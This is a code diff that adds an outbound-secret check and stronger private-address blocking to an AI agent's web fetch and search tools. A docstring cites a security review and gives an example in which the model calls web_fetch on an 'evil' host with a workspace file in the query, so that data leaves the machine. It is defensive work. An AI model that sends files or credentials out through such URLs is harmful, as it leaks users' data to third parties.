@@ -27,6 +27,7 @@ from __future__ import annotations
 import html as _html
 import ipaddress
 import json
+import os
 import re
 import socket
 import time
@@ -78,8 +79,73 @@ class SearchHit:
     snippet: str
 
 
+# Carrier-grade NAT space is not ``is_private`` in Python 3.13, and cluster
+# and VPN internals live there.
+_CGNAT_NET = ipaddress.ip_network("100.64.0.0/10")
+# A lookup URL has no business carrying this much data.
+_MAX_QUERY_CHARS = 2000
+
+
+def _known_secret_values() -> list[str]:
+    """The values of every credential DELFIN holds (store + well-known env),
+    for an exact-match egress check. Never raises; short values ignored."""
+    out: list[str] = []
+    try:
+        from .credentials import _WELL_KNOWN_KEYS, _read_store
+        for val in (_read_store() or {}).values():
+            if isinstance(val, str) and len(val) >= 12:
+                out.append(val)
+        for name in _WELL_KNOWN_KEYS:
+            val = os.environ.get(name, "")
+            if len(val) >= 12:
+                out.append(val)
+    except Exception:
+        pass
+    return out
+
+
+def outbound_secret_reason(text: str) -> Optional[str]:
+    """Why ``text`` must not leave the machine (a URL or a search query), or None.
+
+    Security review 2026-09-16: web_fetch and web_search sent whatever the
+    model put into them -- web_fetch("https://evil/?d=<a workspace file>")
+    went straight out, and a search query reaches up to five third parties.
+    Refused: a credential DELFIN holds (exact value, also URL-encoded), any
+    shape the output guard redacts (API keys, tokens, private keys,
+    password assignments, passwords in URLs), and a query too long to be a
+    lookup.
+    """
+    raw = str(text or "")
+    try:
+        decoded = urllib.parse.unquote_plus(raw)
+    except Exception:
+        decoded = raw
+    for secret in _known_secret_values():
+        if secret in raw or secret in decoded:
+            return "it contains a credential DELFIN holds"
+    try:
+        from .output_guard import _redact_secrets
+        findings: list = []
+        _redact_secrets(decoded, findings)
+        if findings:
+            return "it contains something shaped like a secret (key, token or password)"
+    except Exception:
+        pass
+    try:
+        query = urllib.parse.urlparse(raw).query
+    except Exception:
+        query = ""
+    if len(query) > _MAX_QUERY_CHARS:
+        return f"its query string is {len(query)} characters, too long to be a lookup"
+    return None
+
+
 def _check_url(url: str) -> Optional[str]:
     """Return an error string if the URL is forbidden, else None."""
+    why = outbound_secret_reason(url)
+    if why:
+        return (f"refused to send this URL: {why}. Nothing was sent; "
+                "remove the data from the URL")
     try:
         parsed = urllib.parse.urlparse(url)
     except Exception as exc:
@@ -105,7 +171,8 @@ def _check_url(url: str) -> Optional[str]:
             except ValueError:
                 continue
             if ip.is_loopback or ip.is_link_local or ip.is_private \
-                    or ip.is_multicast or ip.is_reserved:
+                    or ip.is_multicast or ip.is_reserved or ip.is_unspecified \
+                    or ip in _CGNAT_NET:
                 return (
                     f"resolved IP {ip_str} for host {host!r} is "
                     "private/loopback/link-local — refused"
@@ -442,6 +509,10 @@ def web_search(query: str, *, max_results: int = 8,
     when the HTML endpoint returns nothing (e.g. blocked by a 202 anomaly)."""
     if not query.strip():
         return {"error": "query must be non-empty"}
+    _why = outbound_secret_reason(query)
+    if _why:
+        return {"error": f"refused to send this search query: {_why}. "
+                         "Nothing was sent to any search engine."}
     keyed_hits, keyed_source, keyed_error = _keyed_search(query, max_results, timeout_s)
     if keyed_hits:
         return {"query": query, "results": keyed_hits, "source": keyed_source}
